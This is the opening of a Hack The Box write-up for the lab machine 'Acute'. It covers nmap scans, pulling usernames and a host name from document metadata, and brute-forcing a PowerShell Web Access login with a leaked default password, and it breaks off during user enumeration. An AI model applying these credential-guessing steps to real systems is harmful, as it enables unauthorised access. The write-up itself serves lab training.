<!DOCTYPE html><html lang="en-US" ><head><meta http-equiv="Content-Type" content="text/html; charset=UTF-8"><meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no"><meta name="generator" content="Jekyll v4.2.2" /><meta property="og:title" content="Hack The Box - Acute Writeup" /><meta property="og:locale" content="en_US" /><meta name="description" content="Zweilosec’s writeup on the hard-difficulty Windows machine Acute from https://hackthebox.com" /><meta property="og:description" content="Zweilosec’s writeup on the hard-difficulty Windows machine Acute from https://hackthebox.com" /><link rel="canonical" href="https://zweilosec.github.io/posts/acute/" /><meta property="og:url" content="https://zweilosec.github.io/posts/acute/" /><meta property="og:site_name" content="Hacker’s Rest" /><meta property="og:image" content="https://zweilosec.github.io/assets/img/acute_0_infocard.png" /><meta property="og:type" content="article" /><meta property="article:published_time" content="2022-07-14T14:00:00+00:00" /><meta name="twitter:card" content="summary_large_image" /><meta property="twitter:image" content="https://zweilosec.github.io/assets/img/acute_0_infocard.png" /><meta property="twitter:title" content="Hack The Box - Acute Writeup" /><meta name="twitter:site" content="@zweilosec" /><meta name="google-site-verification" content="google_meta_tag_verification" /> <script type="application/ld+json"> {"@context":"https://schema.org","@type":"BlogPosting","dateModified":"2022-07-23T20:49:46+00:00","datePublished":"2022-07-14T14:00:00+00:00","description":"Zweilosec’s writeup on the hard-difficulty Windows machine Acute from https://hackthebox.com","headline":"Hack The Box - Acute Writeup","image":"https://zweilosec.github.io/assets/img/acute_0_infocard.png","mainEntityOfPage":{"@type":"WebPage","@id":"https://zweilosec.github.io/posts/acute/"},"url":"https://zweilosec.github.io/posts/acute/"}</script><title>Hack The Box - Acute Writeup | Hacker's Rest</title><link rel="apple-touch-icon" sizes="180x180" href="/assets/img/favicons/apple-touch-icon.png"><link rel="icon" type="image/png" sizes="32x32" href="/assets/img/favicons/favicon-32x32.png"><link rel="icon" type="image/png" sizes="16x16" href="/assets/img/favicons/favicon-16x16.png"><link rel="manifest" href="/assets/img/favicons/site.webmanifest"><link rel="shortcut icon" href="/assets/img/favicons/favicon.ico"><meta name="apple-mobile-web-app-title" content="Hacker's Rest"><meta name="application-name" content="Hacker's Rest"><meta name="msapplication-TileColor" content="#da532c"><meta name="msapplication-config" content="/assets/img/favicons/browserconfig.xml"><meta name="theme-color" content="#ffffff"><link rel="preconnect" href="https://fonts.gstatic.com" crossorigin="anonymous"><link rel="dns-prefetch" href="https://fonts.gstatic.com"><link rel="preconnect" href="https://www.google-analytics.com" crossorigin="use-credentials"><link rel="dns-prefetch" href="https://www.google-analytics.com"><link rel="preconnect" href="https://www.googletagmanager.com" crossorigin="anonymous"><link rel="dns-prefetch" href="https://www.googletagmanager.com"><link rel="preconnect" href="https://cdn.jsdelivr.net"><link rel="dns-prefetch" href="https://cdn.jsdelivr.net"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/bootstrap@4.0.0/dist/css/bootstrap.min.css"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fortawesome/fontawesome-free@5.11.2/css/all.min.css"><link rel="stylesheet" href="/assets/css/style.css"><link rel="stylesheet" href="https://cdn.jsdelivr.net/gh/afeld/bootstrap-toc@1.0.1/dist/bootstrap-toc.min.css"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/magnific-popup@1.1.0/dist/magnific-popup.min.css"> <script src="https://cdn.jsdelivr.net/npm/jquery@3/dist/jquery.min.js"></script> <script defer src="https://cdn.jsdelivr.net/combine/npm/popper.js@1.15.0,npm/bootstrap@4/dist/js/bootstrap.min.js"></script> <script async src="https://cdn.jsdelivr.net/combine/npm/lozad/dist/lozad.min.js,npm/magnific-popup@1/dist/jquery.magnific-popup.min.js"></script> <script defer src="/assets/js/dist/post.min.js"></script> <script defer src="/app.js"></script> <script defer src="https://www.googletagmanager.com/gtag/js?id=UA-170504820-1"></script> <script> document.addEventListener("DOMContentLoaded", function(event) { window.dataLayer = window.dataLayer || []; function gtag(){dataLayer.push(arguments);} gtag('js', new Date()); gtag('config', 'UA-170504820-1'); }); </script><body data-spy="scroll" data-target="#toc"><div id="sidebar" class="d-flex flex-column align-items-end"><div class="profile-wrapper text-center"><div id="avatar"> <a href="/" alt="avatar" class="mx-auto"> <img src="/assets/img/avatar/katana.gif" alt="avatar" onerror="this.style.display='none'"> </a></div><div class="site-title mt-3"> <a href="/">Hacker's Rest</a></div><div class="site-subtitle font-italic">Notes documenting my journey to OSCP and beyond.</div></div><ul class="w-100"><li class="nav-item"> <a href="/" class="nav-link"> <i class="fa-fw fas fa-home ml-xl-3 mr-xl-3 unloaded"></i> <span>HOME</span> </a><li class="nav-item"> <a href="/categories/" class="nav-link"> <i class="fa-fw fas fa-stream ml-xl-3 mr-xl-3 unloaded"></i> <span>CATEGORIES</span> </a><li class="nav-item"> <a href="/tags/" class="nav-link"> <i class="fa-fw fas fa-tags ml-xl-3 mr-xl-3 unloaded"></i> <span>TAGS</span> </a><li class="nav-item"> <a href="/archives/" class="nav-link"> <i class="fa-fw fas fa-archive ml-xl-3 mr-xl-3 unloaded"></i> <span>ARCHIVES</span> </a><li class="nav-item"> <a href="/about/" class="nav-link"> <i class="fa-fw fas fa-info ml-xl-3 mr-xl-3 unloaded"></i> <span>PS C:\>WHOAMI</span> </a></ul><div class="sidebar-bottom mt-auto d-flex flex-wrap justify-content-center"> <a href="https://github.com/zweilosec" aria-label="github" class="order-3" target="_blank" rel="noopener"> <i class="fab fa-github-alt"></i> </a> <a href="https://twitter.com/zweilosec" aria-label="twitter" class="order-4" target="_blank" rel="noopener"> <i class="fab fa-twitter"></i> </a> <a href=" javascript:location.href = 'mailto:' + ['example','doamin.com'].join('@')" aria-label="email" class="order-5" > <i class="fas fa-envelope"></i> </a> <a href="/feed.xml" aria-label="rss" class="order-6" > <i class="fas fa-rss"></i> </a> <span class="icon-border order-2"></span> <span id="mode-toggle-wrapper" class="order-1"> <i class="mode-toggle fas fa-adjust"></i> <script type="text/javascript"> class ModeToggle { static get MODE_KEY() { return "mode"; } static get DARK_MODE() { return "dark"; } static get LIGHT_MODE() { return "light"; } constructor() { if (this.hasMode) { if (this.isDarkMode) { if (!this.isSysDarkPrefer) { this.setDark(); } } else { if (this.isSysDarkPrefer) { this.setLight(); } } } var self = this; /* always follow the system prefers */ this.sysDarkPrefers.addListener(function() { if (self.hasMode) { if (self.isDarkMode) { if (!self.isSysDarkPrefer) { self.setDark(); } } else { if (self.isSysDarkPrefer) { self.setLight(); } } self.clearMode(); } self.updateMermaid(); }); } /* constructor() */ setDark() { $('html').attr(ModeToggle.MODE_KEY, ModeToggle.DARK_MODE); sessionStorage.setItem(ModeToggle.MODE_KEY, ModeToggle.DARK_MODE); } setLight() { $('html').attr(ModeToggle.MODE_KEY, ModeToggle.LIGHT_MODE); sessionStorage.setItem(ModeToggle.MODE_KEY, ModeToggle.LIGHT_MODE); } clearMode() { $('html').removeAttr(ModeToggle.MODE_KEY); sessionStorage.removeItem(ModeToggle.MODE_KEY); } get sysDarkPrefers() { return window.matchMedia("(prefers-color-scheme: dark)"); } get isSysDarkPrefer() { return this.sysDarkPrefers.matches; } get isDarkMode() { return this.mode == ModeToggle.DARK_MODE; } get isLightMode() { return this.mode == ModeToggle.LIGHT_MODE; } get hasMode() { return this.mode != null; } get mode() { return sessionStorage.getItem(ModeToggle.MODE_KEY); } /* get the current mode on screen */ get modeStatus() { if (this.isDarkMode || (!this.hasMode && this.isSysDarkPrefer) ) { return ModeToggle.DARK_MODE; } else { return ModeToggle.LIGHT_MODE; } } updateMermaid() { if (typeof mermaid !== "undefined") { let expectedTheme = (this.modeStatus === ModeToggle.DARK_MODE? "dark" : "default"); let config = { theme: expectedTheme }; /* re-render the SVG › <https://github.com/mermaid-js/mermaid/issues/311#issuecomment-332557344> */ $(".mermaid").each(function() { let svgCode = $(this).prev().children().html(); $(this).removeAttr("data-processed"); $(this).html(svgCode); }); mermaid.initialize(config); mermaid.init(undefined, ".mermaid"); } } flipMode() { if (this.hasMode) { if (this.isSysDarkPrefer) { if (this.isLightMode) { this.clearMode(); } else { this.setLight(); } } else { if (this.isDarkMode) { this.clearMode(); } else { this.setDark(); } } } else { if (this.isSysDarkPrefer) { this.setLight(); } else { this.setDark(); } } this.updateMermaid(); } /* flipMode() */ } /* ModeToggle */ let toggle = new ModeToggle(); $(".mode-toggle").click(function() { toggle.flipMode(); }); </script> </span></div></div><div id="topbar-wrapper" class="row justify-content-center topbar-down"><div id="topbar" class="col-11 d-flex h-100 align-items-center justify-content-between"> <span id="breadcrumb"> <span> <a href="/"> Posts </a> </span> <span>Hack The Box - Acute Writeup</span> </span> <i id="sidebar-trigger" class="fas fa-bars fa-fw"></i><div id="topbar-title"> Post</div><i id="search-trigger" class="fas fa-search fa-fw"></i> <span id="search-wrapper" class="align-items-center"> <i class="fas fa-search fa-fw"></i> <input class="form-control" id="search-input" type="search" aria-label="search" autocomplete="off" placeholder="Search..."> <i class="fa fa-times-circle fa-fw" id="search-cleaner"></i> </span> <span id="search-cancel" >Cancel</span></div></div><div id="main-wrapper"><div id="main"><div class="row"><div id="post-wrapper" class="col-12 col-lg-11 col-xl-8"><div class="post pl-1 pr-1 pl-sm-2 pr-sm-2 pl-md-4 pr-md-4"><h1 data-toc-skip>Hack The Box - Acute Writeup</h1><div class="post-meta text-muted d-flex flex-column"><div> <span class="semi-bold"> zweilosec </span> <span class="timeago " data-toggle="tooltip" data-placement="bottom" title="Thu, Jul 14, 2022, 2:00 PM +0000" prep="on" > Jul 14, 2022 <i class="unloaded">2022-07-14T14:00:00+00:00</i> </span></div><div> <span> <span class="timeago lastmod" data-toggle="tooltip" data-placement="bottom" title="Sat, Jul 23, 2022, 3:49 PM -0500" prefix="Updated " > Jul 23, 2022 <i class="unloaded">2022-07-23T20:49:46+00:00</i> </span> </span> <span class="readtime" data-toggle="tooltip" data-placement="bottom" title="6046 words">33 min</span></div><div><meta name="twitter:card" content="summary"><meta name="twitter:site" content="@zweilosec"></div></div><div class="post-content"><h2 id="htb---acute---101011145">HTB - Acute - 10.10.11.145</h2><h2 id="overview">Overview</h2><p><img src="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-src="/assets/img/acute_0_infocard.png" alt="Descriptive information card about this machine" /></p><p>This Hard-difficulty Windows machine from https://hackthebox.com was quite a challenge! It required some very specific enumeration to be done, otherwise key information would be lacking. Once these hurdles were cleared, the machine challenged me to pivot back and forth between two systems, slowly increasing my level of access with each new user account compromised.</p><h2 id="useful-skills-and-tools">Useful Skills and Tools</h2><h3 id="exiftool">exiftool</h3><p>Exiftool is highly useful for extracting metadata from documents extracted during enumeration. Leaking metadata can lead to compromise if it gets into the wrong hands, as it can carry host- and usernames and other information useful to hackers.</p><h3 id="replace-text-in-a-file-with-powershell">Replace text in a file with PowerShell</h3><ul><li>https://stackoverflow.com/questions/21391012/modify-the-contents-of-a-file-in-powershell</ul><div class="language-plaintext highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
</pre><td class="rouge-code"><pre>(Get-Content $txt_file) -replace '$text_to_remove', '$text_to_add' | Out-File $txt_file
</pre></table></code></div></div><p>Using the above code as a template, you can replace text in a file directly on the PowerShell commandline, without opening it in an editor.</p><h2 id="enumeration">Enumeration</h2><h3 id="nmap-scan">Nmap scan</h3><p>I started my enumeration with an nmap scan of <code class="language-plaintext highlighter-rouge">10.10.11.145</code>. The options I regularly use are:</p><div class="table-wrapper"><table><thead><tr><th style="text-align: left"><code class="language-plaintext highlighter-rouge">Flag</code><th style="text-align: left">Purpose<tbody><tr><td style="text-align: left"><code class="language-plaintext highlighter-rouge">-p-</code><td style="text-align: left">A shortcut which tells nmap to scan all ports<tr><td style="text-align: left"><code class="language-plaintext highlighter-rouge">-vvv</code><td style="text-align: left">Gives very verbose output so I can see the results as they are found, and also includes some information not normally shown<tr><td style="text-align: left"><code class="language-plaintext highlighter-rouge">-sC</code><td style="text-align: left">Equivalent to <code class="language-plaintext highlighter-rouge">--script=default</code> and runs a collection of nmap enumeration scripts against the target<tr><td style="text-align: left"><code class="language-plaintext highlighter-rouge">-sV</code><td style="text-align: left">Does a service version scan<tr><td style="text-align: left"><code class="language-plaintext highlighter-rouge">-oA $name</code><td style="text-align: left">Saves all three formats (standard, greppable, and XML) of output with a filename of <code class="language-plaintext highlighter-rouge">$name</code><tr><td style="text-align: left"><code class="language-plaintext highlighter-rouge">-Pn</code><td style="text-align: left">Skips doing a ICMP ping check, useful for hosts that do not reply to these</table></div><p>First I scanned for open ports, then fed the ports list back into nmap to do a more in-depth service scan.</p><div class="language-plaintext highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
16
17
18
19
20
</pre><td class="rouge-code"><pre>┌──(zweilos㉿kalimaa)-[~/htb/acute]
└─$ nmap -Pn -vvv -p- --min-rate 1000 10.10.11.145 -oN ports.acute 
Starting Nmap 7.92 ( https://nmap.org ) at 2022-07-04 18:48 CDT
Initiating Parallel DNS resolution of 1 host. at 18:48
Completed Parallel DNS resolution of 1 host. at 18:48, 0.04s elapsed
DNS resolution of 1 IPs took 0.04s. Mode: Async [#: 1, OK: 0, NX: 1, DR: 0, SF: 0, TR: 1, CN: 0]
Initiating Connect Scan at 18:48
Scanning 10.10.11.145 [65535 ports]
Discovered open port 443/tcp on 10.10.11.145

Completed Connect Scan at 18:50, 123.27s elapsed (65535 total ports)
Nmap scan report for 10.10.11.145
Host is up, received user-set (0.069s latency).
Scanned at 2022-07-04 18:48:00 CDT for 124s
Not shown: 65534 filtered tcp ports (no-response)
PORT    STATE SERVICE REASON
443/tcp open  https   syn-ack

Read data files from: /usr/bin/../share/nmap
Nmap done: 1 IP address (1 host up) scanned in 123.35 seconds
</pre></table></code></div></div><p>port 443 was the only one open</p><div class="language-plaintext highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
16
17
18
19
20
21
22
23
24
25
26
27
28
29
30
31
32
33
</pre><td class="rouge-code"><pre>┌──(zweilos㉿kalimaa)-[~/htb/acute]
└─$ nmap -Pn -sCV -v -p443 10.10.11.145 -oA services.acute
Starting Nmap 7.92 ( https://nmap.org ) at 2022-07-19 11:19 CDT

Nmap scan report for atsserver (10.10.11.145)
Host is up (0.067s latency).

PORT    STATE SERVICE  VERSION
443/tcp open  ssl/http Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
| ssl-cert: Subject: commonName=atsserver.acute.local
| Subject Alternative Name: DNS:atsserver.acute.local, DNS:atsserver
| Issuer: commonName=acute-ATSSERVER-CA
| Public Key type: rsa
| Public Key bits: 2048
| Signature Algorithm: sha256WithRSAEncryption
| Not valid before: 2022-01-06T06:34:58
| Not valid after:  2030-01-04T06:34:58
| MD5:   cf3a d387 8ede 75cf 89c1 8806 0b6b c823
|_SHA-1: f954 d677 0cf3 54df 3fa2 ed4f 78c3 1902 c120 a368
|_ssl-date: 2022-07-19T16:19:46+00:00; -1s from scanner time.
|_http-title: Not Found
|_http-server-header: Microsoft-HTTPAPI/2.0
| tls-alpn: 
|_  http/1.1
Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows

Host script results:
|_clock-skew: -1s

NSE: Script Post-scanning.

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 24.61 seconds
</pre></table></code></div></div><p>The service scan revealed a hostname of <code class="language-plaintext highlighter-rouge">atsserver</code> and a domain name of <code class="language-plaintext highlighter-rouge">acute.local</code>.</p><h3 id="port-443-https">Port 443 (HTTPS)</h3><p><img src="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-src="/assets/img/acute_1_404.png" alt="404 error for 10.10.11.145" /></p><p>I tried navigating to <code class="language-plaintext highlighter-rouge">https://10.10.11.145</code> but after accepting the security warning I was directed to a 404 error page.</p><p><img src="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-src="/assets/img/acute_2_cert.png" alt="Checking the website security certificate" /></p><p>Checking the certificate gave the same hostname of the certificate authority and the web host, so I added <code class="language-plaintext highlighter-rouge">atsserver</code> to my <code class="language-plaintext highlighter-rouge">/etc/hosts</code> file for this IP.</p><p><img src="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-src="/assets/img/acute_3_https.png" alt="Navigating to the full website address" /></p><p>After this I was able to navigate to the page using the full name of the host.</p><h3 id="the-onboarding-document">The onboarding document</h3><p><img src="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-src="/assets/img/acute_4_about_forms.png" alt="Link to New Starter Checklist document" /></p><p>On the <code class="language-plaintext highlighter-rouge">About.html</code> page there was a link to “New Starter Forms” -&gt; https://atsserver.acute.local/New_Starter_CheckList_v7.docx.</p><p>I also found a list of potential usernames: Aileen Wallace, Charlotte Hall, Evan Davies, Ieuan Monks, Joshua Morgan, and Lois Hopkins.</p><p>I downloaded the document <code class="language-plaintext highlighter-rouge">New_Starter_CheckList_v7.docx</code> to my system and began perusing it to see if there was anything useful inside. The document contained a lot of information pertaining to new hires. Most of it was not very interesting to me, but I did find a few links</p><blockquote><p>The University’s staff induction pages can be found at: https://atsserver.acute.local/Staff The Staff Induction portal can be found here: https://atsserver.acute.local/Staff/Induction</p></blockquote><p>Neither of these links led anywhere except another standard 404 error page. The document also had a link to remote training at https://atsserver.acute.local/Acute_Staff_Access</p><h3 id="powershell-web-access">PowerShell Web Access</h3><p><img src="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-src="/assets/img/acute_6_PowerShell_web_access.png" alt="PowerShell Web Acces login page" /></p><p>Following this link led to a PowerShell Web Access portal at https://atsserver.acute.local/Acute_Staff_Access/en-US/logon.aspx?ReturnUrl=%2fAcute_Staff_Access. I noticed that there was an option for kerberos authentication, which looked like it could potentially be used to enumerate users. Before I tried any further testing, I decided to finish going through the document to see what else I could find.</p><p>There was an interesting line from the document that said</p><blockquote><p>“**Lois is the only authorized personnel to change Group Membership, Contact Lois to have this approved and changed if required. Only Lois can become site admin. **”</p></blockquote><p>This looked like a user I would need to target. I wasn’t sure if <code class="language-plaintext highlighter-rouge">site admin</code> was the name of a security group, but it was something to keep in mind.</p><p>I also found a default password for new hires:</p><blockquote><p>“Walk the new starter through the password change policy, they will need to change it from the default <code class="language-plaintext highlighter-rouge">Password1!</code>. Not all staff are changing these so please be sure to run through this.”</p></blockquote><p>The fact that not all staff would change their password from the default was something that could be abused in this instance to get access. Next I did some research to see what I could discover about PowerShell Web Access.</p><ul><li>https://docs.microsoft.com/en-us/previous-versions/windows/it-pro/windows-server-2012-R2-and-2012/hh831611(v=ws.11)?redirectedfrom=MSDN</ul><p>In case it was useful I took note of the Physical Path of the PowerShell Web Access directory on the server: <code class="language-plaintext highlighter-rouge">%windir%/Web/PowerShellWebAccess/wwwroot</code>. There was also an interesting security note regarding what sounded like a way to pivot to other computers.</p><blockquote><p>Security Note</p><p>A user needs only one rule to be true to get access. If a user is given access to one computer with either full language access or access only to Windows PowerShell remote management cmdlets, from the web-based console, the user can log on (or hop) to other computers that are connected to the first target computer. The most secure way to configure Windows PowerShell Web Access is to allow users access only to constrained session configurations (also called endpoints or runspaces) that allow them to accomplish specific tasks that they normally need to perform remotely.</p></blockquote><p>After reviewing the information needed to log in (and after checking the error messages I got), I found that I needed a computername. None of the usernames I had were able to log into <code class="language-plaintext highlighter-rouge">atsserver</code> with the password I found.</p><h3 id="exiftool-1">exiftool</h3><div class="language-plaintext highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
16
17
18
19
20
21
22
23
24
25
26
27
28
29
30
31
32
33
34
35
36
37
38
39
40
41
42
43
44
45
46
</pre><td class="rouge-code"><pre>┌──(zweilos㉿kalimaa)-[~/htb/acute]
└─$ exiftool New_Starter_CheckList_v7.docx
ExifTool Version Number         : 12.42
File Name                       : New_Starter_CheckList_v7.docx
Directory                       : .
File Size                       : 35 kB
File Modification Date/Time     : 2022:07:04 19:00:45-05:00
File Access Date/Time           : 2022:07:04 19:01:30-05:00
File Inode Change Date/Time     : 2022:07:04 19:01:29-05:00
File Permissions                : -rw-r--r--
File Type                       : DOCX
File Type Extension             : docx
MIME Type                       : application/vnd.openxmlformats-officedocument.wordprocessingml.document
Zip Required Version            : 20
Zip Bit Flag                    : 0x0006
Zip Compression                 : Deflated
Zip Modify Date                 : 1980:01:01 00:00:00
Zip CRC                         : 0x079b7eb2
Zip Compressed Size             : 428
Zip Uncompressed Size           : 2527
Zip File Name                   : [Content_Types].xml
Creator                         : FCastle
Description                     : Created on Acute-PC01
Last Modified By                : Daniel
Revision Number                 : 8
Last Printed                    : 2021:01:04 15:54:00Z
Create Date                     : 2021:12:08 14:21:00Z
Modify Date                     : 2021:12:22 00:39:00Z
Template                        : Normal.dotm
Total Edit Time                 : 2.6 hours
Pages                           : 3
Words                           : 886
Characters                      : 5055
Application                     : Microsoft Office Word
Doc Security                    : None
Lines                           : 42
Paragraphs                      : 11
Scale Crop                      : No
Heading Pairs                   : Title, 1
Titles Of Parts                 : 
Company                         : University of Marvel
Links Up To Date                : No
Characters With Spaces          : 5930
Shared Doc                      : No
Hyperlinks Changed              : No
App Version                     : 16.0000
</pre></table></code></div></div><p>Since <code class="language-plaintext highlighter-rouge">.docx</code> files often store a lot of juicy metadata in them I ran <code class="language-plaintext highlighter-rouge">exiftool</code> on the document. This revealed the name of a computer <code class="language-plaintext highlighter-rouge">Acute-PC01</code>, and a username <code class="language-plaintext highlighter-rouge">FCastle</code>. I used the names I found earlier and made a list of potential usernames with the format firstInitial + lastName, using this as a template.</p><h2 id="initial-foothold">Initial Foothold</h2><p><img src="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-src="/assets/img/acute_6_pwa_burp.png" alt="Using Burp to capture the login request" /></p><p>I used the Burp suite to capture a request to the login page, then sent it to the Intruder tool to do a simple brute force of the username.</p><p><img src="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-src="/assets/img/acute_7_pwa_burp_intruder.png" alt="Using Burp Intruder to brute force the login username" /></p><p>Using Burp Intruder I was able to determine that the user <code class="language-plaintext highlighter-rouge">EDavies</code> hadnt changed their password from the default of <code class="language-plaintext highlighter-rouge">Password1!</code>. This could be seen by the <code class="language-plaintext highlighter-rouge">302</code> error the request caused rather than the <code class="language-plaintext highlighter-rouge">200</code> (OK).</p><p><img src="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-src="/assets/img/acute_8_web-powershell_console.png" alt="The PowerShell Web Access command prompt" /></p><p>After logging in, I was brought to a web PowerShell prompt.</p><h3 id="enumeration-as-edavies">Enumeration as edavies</h3><div class="language-powershell highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
16
17
18
19
20
21
22
23
24
25
26
27
28
29
30
31
32
33
34
35
36
37
38
39
40
41
42
43
44
45
46
</pre><td class="rouge-code"><pre><span class="n">PS</span><span class="w"> </span><span class="nx">C:\Users\edavies\Documents</span><span class="err">&gt;</span><span class="w"> </span><span class="nx">Get-ExecutionPolicy</span><span class="w">

</span><span class="n">Restricted</span><span class="w">

</span><span class="n">PS</span><span class="w"> </span><span class="nx">C:\Users\edavies\Documents</span><span class="err">&gt;</span><span class="w"> </span><span class="nx">Get-ChildItem</span><span class="w"> </span><span class="nx">Env:</span><span class="w">

</span><span class="n">Name</span><span class="w">                           </span><span class="nx">Value</span><span class="w">                                                                                   
</span><span class="o">----</span><span class="w">                           </span><span class="o">-----</span><span class="w">                                                                                   

</span><span class="n">ALLUSERSPROFILE</span><span class="w">                </span><span class="nx">C:\ProgramData</span><span class="w">                                                                          
</span><span class="n">APPDATA</span><span class="w">                        </span><span class="nx">C:\Users\edavies\AppData\Roaming</span><span class="w">                                                        
</span><span class="n">CommonProgramFiles</span><span class="w">             </span><span class="nx">C:\Program</span><span class="w"> </span><span class="nx">Files\Common</span><span class="w"> </span><span class="nx">Files</span><span class="w">                                                           
</span><span class="n">CommonProgramFiles</span><span class="p">(</span><span class="n">x86</span><span class="p">)</span><span class="w">        </span><span class="n">C:\Program</span><span class="w"> </span><span class="nx">Files</span><span class="w"> </span><span class="p">(</span><span class="n">x86</span><span class="p">)</span><span class="n">\Common</span><span class="w"> </span><span class="nx">Files</span><span class="w">                                                     
</span><span class="n">CommonProgramW6432</span><span class="w">             </span><span class="nx">C:\Program</span><span class="w"> </span><span class="nx">Files\Common</span><span class="w"> </span><span class="nx">Files</span><span class="w">                                                           
</span><span class="n">COMPUTERNAME</span><span class="w">                   </span><span class="nx">ACUTE-PC01</span><span class="w">                                                                              
</span><span class="n">ComSpec</span><span class="w">                        </span><span class="nx">C:\Windows\system32\cmd.exe</span><span class="w">                                                             
</span><span class="n">DriverData</span><span class="w">                     </span><span class="nx">C:\Windows\System32\Drivers\DriverData</span><span class="w">                                                  
</span><span class="n">HOMEDRIVE</span><span class="w">                      </span><span class="nx">C:</span><span class="w">                                                                                      
</span><span class="n">HOMEPATH</span><span class="w">                       </span><span class="nx">\Users\edavies</span><span class="w">                                                                          
</span><span class="n">LOCALAPPDATA</span><span class="w">                   </span><span class="nx">C:\Users\edavies\AppData\Local</span><span class="w">                                                          
</span><span class="n">LOGONSERVER</span><span class="w">                    </span><span class="nx">\\ATSSERVER</span><span class="w">                                                                             
</span><span class="n">NUMBER_OF_PROCESSORS</span><span class="w">           </span><span class="nx">1</span><span class="w">                                                                                       
</span><span class="n">OneDrive</span><span class="w">                       </span><span class="nx">C:\Users\edavies\OneDrive</span><span class="w">                                                               
</span><span class="n">OS</span><span class="w">                             </span><span class="nx">Windows_NT</span><span class="w">                                                                              
</span><span class="n">Path</span><span class="w">                           </span><span class="nx">C:\Windows\system32</span><span class="p">;</span><span class="n">C:\Windows</span><span class="p">;</span><span class="n">C:\Windows\System32\Wbem</span><span class="p">;</span><span class="n">C:\Windows\System32\WindowsPo...</span><span class="w">
</span><span class="nx">PATHEXT</span><span class="w">                        </span><span class="o">.</span><span class="nf">COM</span><span class="p">;</span><span class="o">.</span><span class="nf">EXE</span><span class="p">;</span><span class="o">.</span><span class="nf">BAT</span><span class="p">;</span><span class="o">.</span><span class="nf">CMD</span><span class="p">;</span><span class="o">.</span><span class="nf">VBS</span><span class="p">;</span><span class="o">.</span><span class="nf">VBE</span><span class="p">;</span><span class="o">.</span><span class="nf">JS</span><span class="p">;</span><span class="o">.</span><span class="nf">JSE</span><span class="p">;</span><span class="o">.</span><span class="nf">WSF</span><span class="p">;</span><span class="o">.</span><span class="nf">WSH</span><span class="p">;</span><span class="o">.</span><span class="nf">MSC</span><span class="p">;</span><span class="o">.</span><span class="nf">CPL</span><span class="w">                              
</span><span class="n">PROCESSOR_ARCHITECTURE</span><span class="w">         </span><span class="nx">AMD64</span><span class="w">                                                                                   
</span><span class="n">PROCESSOR_IDENTIFIER</span><span class="w">           </span><span class="nx">Intel64</span><span class="w"> </span><span class="nx">Family</span><span class="w"> </span><span class="nx">6</span><span class="w"> </span><span class="nx">Model</span><span class="w"> </span><span class="nx">85</span><span class="w"> </span><span class="nx">Stepping</span><span class="w"> </span><span class="nx">7</span><span class="p">,</span><span class="w"> </span><span class="nx">GenuineIntel</span><span class="w">                                      
</span><span class="n">PROCESSOR_LEVEL</span><span class="w">                </span><span class="nx">6</span><span class="w">                                                                                       
</span><span class="n">PROCESSOR_REVISION</span><span class="w">             </span><span class="nx">5507</span><span class="w">                                                                                    
</span><span class="n">ProgramData</span><span class="w">                    </span><span class="nx">C:\ProgramData</span><span class="w">                                                                          
</span><span class="n">ProgramFiles</span><span class="w">                   </span><span class="nx">C:\Program</span><span class="w"> </span><span class="nx">Files</span><span class="w">                                                                        
</span><span class="n">ProgramFiles</span><span class="p">(</span><span class="n">x86</span><span class="p">)</span><span class="w">              </span><span class="n">C:\Program</span><span class="w"> </span><span class="nx">Files</span><span class="w"> </span><span class="p">(</span><span class="n">x86</span><span class="p">)</span><span class="w">                                                                  
</span><span class="n">ProgramW6432</span><span class="w">                   </span><span class="nx">C:\Program</span><span class="w"> </span><span class="nx">Files</span><span class="w">                                                                        
</span><span class="n">PSModulePath</span><span class="w">                   </span><span class="nx">C:\Users\edavies\Documents\WindowsPowerShell\Modules</span><span class="p">;</span><span class="n">C:\Program</span><span class="w"> </span><span class="nx">Files\WindowsPowerShe...</span><span class="w">
</span><span class="kr">PUBLIC</span><span class="w">                         </span><span class="n">C:\Users\Public</span><span class="w">                                                                         
</span><span class="n">SystemDrive</span><span class="w">                    </span><span class="nx">C:</span><span class="w">                                                                                      
</span><span class="n">SystemRoot</span><span class="w">                     </span><span class="nx">C:\Windows</span><span class="w">                                                                              
</span><span class="n">TEMP</span><span class="w">                           </span><span class="nx">C:\Users\edavies\AppData\Local\Temp</span><span class="w">                                                     
